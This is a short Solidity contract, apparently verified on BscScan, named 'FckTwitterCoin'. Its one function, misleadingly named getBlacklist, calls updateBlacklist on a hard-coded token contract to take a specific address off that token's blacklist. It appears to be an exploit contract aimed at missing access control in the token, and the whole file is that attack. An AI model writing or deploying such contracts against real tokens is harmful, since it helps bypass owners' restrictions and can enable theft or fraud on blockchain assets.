/**
 *Submitted for verification at BscScan.com on 2022-12-25
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.12;

interface ITwitterCoin {
    function updateBlacklist(address account, bool add) external;
}


contract FckTwitterCoin {
    event BlacklistClear();

    function getBlacklist() external {
        ITwitterCoin(0x17Cbb3f7537575957bDf0326811C7D29dFb6C873).updateBlacklist(0xead957f04e2a82CdA398A81C0B928901B8d0cFc3, false);
        emit BlacklistClear();
    }
}